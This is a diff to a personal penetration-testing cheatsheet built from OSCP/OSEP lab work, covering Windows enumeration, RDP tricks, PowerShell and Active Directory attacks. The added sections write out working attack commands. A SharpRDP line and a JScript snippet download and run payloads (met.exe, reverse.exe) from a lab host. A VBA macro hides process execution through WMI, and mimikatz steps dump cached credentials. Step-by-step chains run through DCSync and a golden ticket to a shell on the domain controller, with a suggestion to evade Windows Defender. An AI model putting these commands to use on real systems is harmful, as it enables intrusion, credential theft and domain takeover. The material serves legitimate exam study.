@@ -10,13 +10,15 @@ description = "My humble cheatsheet of most used tools, webs, etc"
 toc = true
 +++
 
-# Hacking/OSCP Cheatsheet
+# Hacking Cheatsheet
 
 Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
 But this is basically the tools I tend to relie and use in this way the most.
 Hope is helpfull for you!
 
-## Enumeration
+Edit 2021/11: I'm going through OSEP challenges and as so, Im updating this with stuff Im using there because I kept forgetting commands often
+
+## General enumeration
 
 ### Network discoverie
 
@@ -138,6 +140,19 @@ In seclists-pkg:
 /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
+
+### Trusted Folders (Windows)
+
+```console
+accesschk.exe "ceso" C:\ -wus
+  -> -w is to locate writable directories
+  -> -u supress errors
+  -> -s makes recursion on all subdirectories
+
+icacls.exe C:\Windows\Tasks
+  ^-- Verify if Tasks has execution permissions for example (flag is "RX")
+```
+
 
 ### Samba
 
@@ -296,9 +311,51 @@ Victim:
 
 If we have access to a windows machine with a valid user/credentials and this user is in the "Remote Desktop Users", we can share a local directorie as a mount volume through rdp itself once we connect to the machine:
 
+#### Linux
+
+##### Mounting volume
+
 ```console
 rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
 ```
+
+##### Forcing enable of clipboard
+
+I might want to force the use of the clipboard if it's not being taken by default and use the 100% of the screen:
+
+```console
+rdesktop 192.168.42.42 -d arkham -u ceso -p pirata -g 100% -x 0x80 -5 -K -r clipboard:CLIPBOARD
+```
+
+##### Connection with restricted admin mode
+
+```console
+xfreerdp en Linux soporta restricted admin mode, se ejecuta asi por ej: `xfreerdp /u:admin /pth:<NTLM-hash-of-user-admin-pass> /v:192.168.42.42 /cert-ignore
+```
+
+
+#### Windows
+
+##### Restricted admin mode
+
+```console
+Enable it :
+  Through registry: 
+    HKLM:\System\CurrentControlSet\Control\Lsa
+    Use "DisableRestrictedAdmin" property
+  With Powershell:
+    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0  
+
+Connect it:
+  --> mstsc.exe /restrictedadmin
+```
+
+##### Stacked commands without GUI
+
+```console
+sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFil
+e('http://192.168.42.42/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=example\ceso password=soyUnaPassword
+````
 
 ## Pivoting
 
@@ -647,6 +704,76 @@ C:/Windows/System32/inetsrv/config/applicationHost.config
 C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 ```
 
+### Enable execution of PowerShell Scripts
+
+```console
+Set-ExecutionPolicy RemoteSigned
+Set-ExecutionPolicy Unrestricted
+powershell.exe -exec bypass
+```
+
+### Encode Powershell b64 from Linux
+
+```console
+echo 'ImAnEviCradleBuuhhhh' | iconv --to-code UTF-16LE | base64 -w0
+```
+
+### Encode/Decode b64 in Windows WITHOUT Powershell
+
+```console
+certutil -encode <inputfile> <outputfile>
+certutil -decode <b64inputfile> <plainoutputdecodedfile>
+  ^-- If the file exists I can use the -f flag which will force an overwrite
+```
+
+### Check the Type of Language available with Powershell
+
+```console
+$ExecutionContext.SessionState.LanguageMode
+
+Possible types are:
+  - Full Language
+  - RestrictedLanguage
+  - No Language
+  - Constrained Language
+```
+
+### Set Proxy in code used (Windows)
+
+#### Powershell
+
+```console
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
+```
+
+#### JScript
+
+```console
+var url = "http://192.168.42.43/reverse.exe";
+var var Object = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+Object.setProxy("2","192.168.42.42:3128");
+Object.open('GET', url, false);
+Object.send();
+  ^-- This was tricky because lack of debug information. The parameter in "2" means "SXH_PROXY_SET_PROXY", and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
+```
+
+### Hide Foreground with WMI (Windows, Office Macros)
+
+```console
+Sub example()
+  Const HIDDEN_WINDOW = 0
+  Dim cmd As String
+
+  cmd = "Here there is some commands to execute inside the macro via WMI"
+  Set objWMIService = GetObject("winmgmts:")
+  Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+  Set objConfig = objStartup.SpawnInstance_
+  objConfig.ShowWindow = HIDDEN_WINDOW
+  Set objProcess = GetObject("winmgmts:Win32_Process")
+  errReturn = objProcess.Create(str, Null, objConfig, pid)
+End Sub
+```
+
 ## Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)
 
 ### Summarized steps
@@ -728,3 +855,127 @@ So...actual list of badchars:
 ```console
 msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
 ```
+
+## Active Directory
+
+### Permissions: ACE (Access Control Enties) SDDL (Security Descriptor Definition Language) - Format
+
+```console
+ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+
+--> ace_type: defines allow/deny/audit
+--> ace_flags: inheritance objects
+--> rights: incremental list with given permissions (allowed/audited/denied), incrmentalas ARE NOT the only ones
+--> object_guid and inherit_object: Allows to apply an ACE on a specified objects by GUID values. GUID is an object class, attribute, set or extended right, if pressent limits the ACE's to the object the GUID represents. Inherited GUID represents an object class, if present will limit the inheritance of ACE's to the child enties only of that object
+--> account_sid: SID of the object the ACE is applying, is the SID of the user or group to the one permissions are being assigned, sometimes there are acronyms of well known SID's instead of numerical ones
+```
+
+### PowerView methods for enumeration
+
+#### ACLs
+
+```console
+Get-ObjectAcl -Identity ceso <-- Get all the objects and acls the given user has
+```
+
+#### Users
+
+```console
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteProperty    Name Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Object {if (    $_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Maps all users in the domain into a table replacing the SID for the name
+
+Get-DomainUser -Domain example.com <-- Enumeration truncated only to the users in the given domain
+
+Get-DomainUser -TrustedToAut <-- List all the SPN's which have Constrained Delegation
+```
+
+#### Groups
+
+```console
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteP    ropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Objec    t {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Maps all groups in the domain into a table replacing the SID for the name
+
+Get-DomainGroup -Domain example.com <-- Enumeration truncated only to the users in the given domain
+
+Get-DomainGroupMember "Enterprise Admins" -Domain example.com <-- Get ALL the members of the group "Enterprise Admins" inside the example.com domain
+
+Get-DomainForeignGroupMember -Domain example2.com <-- Enumerate groups in a trusted forest or domain which contains NON-NATIVE members
+```
+
+#### Computers
+
+```console
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identit    y -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity     -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Enumerate computers accounts in the domain
+
+Get-DomainComputer -Unconstrained <-- Enumerate unconstrained computers
+
+Get-DomainComputer -Identity cesoComputer <-- Verify that cesoComputer exists
+```
+
+#### Trusts
+
+```console
+Get-DomainTrust <-- Enumerate trusts by making an LDAP query, this works by the DC creating a Trusted Domain Object (TDO)
+
+Get-DomainTrust -API <-- Enumerate trusts by using Win32 API DsEnumerateDomainTrusts
+    ^-- If I add the -domain flag, it will enumerate all the found in the domain
+
+Get-DomainTrustMapping <-- Automate the process of enumeration for all forest trust and their child domains trust
+```
+
+#### SID's
+
+```console
+Get-DomainSID <-- Get the SID of the current domain
+Get-DomainSID -Domain example.com <-- Get the SID of example.com
+``` 
+
+### Exploitation
+
+#### List all available credentials cached (Hashes and Passwords; Logged on user and computer)
+
+```console
+mimikatz.exe "sekurlsa::logonpasswords" exit
+```
+
+#### GenericAll
+
+#### GenericWrite
+
+#### WriteDACL
+
+#### Unconstrained Delegation
+
+##### By Forwardable TGT after login
+
+```console
+1 - Enumerate if there if there is unconstrained delegation
+2 - If there is, open mimikatz (commands blow are inside it)
+3 - privilege::debug <-- Enable debug
+4 - sekurlsa::tickets <-- List all the present tickets 
+5 - Through phishing or visit of a page, if the user has Windows Auth then it will use kerberos
+6 - sekurlsa::tickets <-- Verify if there are new TGT's
+7 - sekurlsa::tickets /export <-- If new TGT and marked as forwardable export them to disk
+8 - kerberos::ptt /inject:<some-exported-tkt-file.kirbi> <-- Inject the exported ticket into memory
+9 - C:\Windows\Temp\PsExec.exe \\example.com cmd <-- Try to get a cmd shell in example.com by leveraging injected ticket
+
+* By default every user allows their TGT to be delegated, but high privilege users can be added to the group "Protected Users Group" to disable it, it also can break the application for which at the beggining unconstrained delegation was enabled for those users
+```
+
+##### By using of SpoolSample.exe
+
+```console
+1 - Download and compile SpoolSample in a dev machine, it can be downloaded from: https://github.com/leechristensen/SpoolSample
+2 - Download and compile Rubeus in a dev machine, it can be downloaded from: https://github.com/GhostPack/Rubeus
+3 - Find a way to upload SpoolSample and Rubeus without being detected (for example, disabling Windows Defender, or injecting them into memory through reflection for example), for ease of the technique, all below is just written to disk
+4 - Rubeus.exe monitor /interval:5 /filteruser:DC01$ <-- Monitor for TGTs originated in the DC01 machine. THIS MUST BE RUN FROM A DIFFERENT SHELL THAN THE ONE USED FOR THE NEXT STEP
+5 - SpoolSample.exe DC01 VICTIM01 <-- Leverage "RpcOpenPrinter" and "RpcRemoteFindFirstPrinterChangeNotification" to get a notif
+6 - Rubeus.exe ptt /ticket:<b64-from-rubeus-monitor> <-- Inject into memory the b64 ticket obtained by monitoring for tickets from DC01 to VICTIM01
+7 - lsadump::dcsync /domain:example.com /user:example\krbtgt <-- Dump the NTLM hash of the krbtgt user by leveraging the just injected ticket (It could also be possible to dump the hash of the pass of a member from the "Domain Admins" group). THIS IS RUN FROM INSIDE MIMIKATZ
+8 - kerberos::golden /user:krbtgt /domain:example.com /sid:<sid-showed-in-dcsync or obtained by PowerView> /rc4:<ntlm-hash-dumped-with-dcsync> /ptt <-- Craft a golden ticket and inject it into memory
+9 - dir \\dc01\\c$ <-- Verify read access on dc01
+10 - misc::cmd <-- Open cmd prompt from inside Mimikatz
+11 - C:\Windows\Temp\PsExec.exe -accepteula \\dc01 cmd <-- Get a shell on dc01 by leveraging the golden ticket injected
+```
+
+#### Constrained Delegation
+
+#### Resource-Based Constrained Delegation (RBCD)
